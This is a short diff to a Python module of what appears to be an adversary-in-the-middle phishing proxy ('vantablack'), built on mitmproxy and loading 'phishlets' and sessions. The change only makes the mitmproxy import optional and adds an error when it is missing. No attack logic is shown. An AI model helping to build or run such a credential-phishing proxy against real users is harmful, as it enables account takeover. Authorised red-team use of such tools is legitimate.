@@ -15,8 +15,14 @@ from typing import Optional, Dict, List
 import logging
 from dataclasses import dataclass
 from enum import Enum
-from mitmproxy.tools.dump import DumpMaster
-from mitmproxy import options
+try:
+    from mitmproxy.tools.dump import DumpMaster
+    from mitmproxy import options
+    _MITM_AVAILABLE = True
+except Exception:
+    DumpMaster = None  # type: ignore
+    options = None  # type: ignore
+    _MITM_AVAILABLE = False
 from core.edge.interceptor import VantaInterceptor
 from core.edge.phishlets import PhishletLoader
 from core.edge.session import SessionManager
@@ -45,13 +51,16 @@ class EdgeProxy:
         self.config = config
         self.logger = logging.getLogger("vantablack.edge")
         self._running = False
-        self._master: Optional[DumpMaster] = None
+        self._master: Optional["DumpMaster"] = None
         self.session_manager = SessionManager()
         self.phishlet_loader = PhishletLoader()
         
     async def start(self, phishlet_yaml: str):
         """Start the proxy service with a specific phishlet"""
         self.logger.info(f"Starting Edge Proxy on {self.config.listen_host}:{self.config.listen_port}")
+        if not _MITM_AVAILABLE:
+            self.logger.error("mitmproxy not available")
+            raise RuntimeError("mitmproxy not installed")
         
         # Load Phishlet
         phishlet = self.phishlet_loader.load_from_yaml(phishlet_yaml)
